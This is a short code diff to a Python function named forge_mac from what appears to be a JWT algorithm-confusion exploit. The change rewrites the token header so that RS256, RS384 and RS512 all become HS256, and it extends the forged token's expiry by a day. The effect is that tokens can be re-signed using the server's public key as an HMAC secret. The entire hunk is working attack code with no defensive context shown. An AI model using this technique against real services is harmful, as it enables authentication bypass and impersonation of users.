@@ -33,7 +33,8 @@ def forge_mac(jwt0, public_key):
     jwt0_msg=b'.'.join(jwt0_parts[0:2])
 
     alg=b64urldecode(jwt0_parts[0].decode('utf8'))
-    alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256"))
+    # Always use HS256
+    alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256").replace(b"RS384", b"HS256").replace(b"RS512", b"HS256"))
 
     payload=json.loads(b64urldecode(jwt0_parts[1].decode('utf8')))
     payload['exp'] = int(time.time())+86400
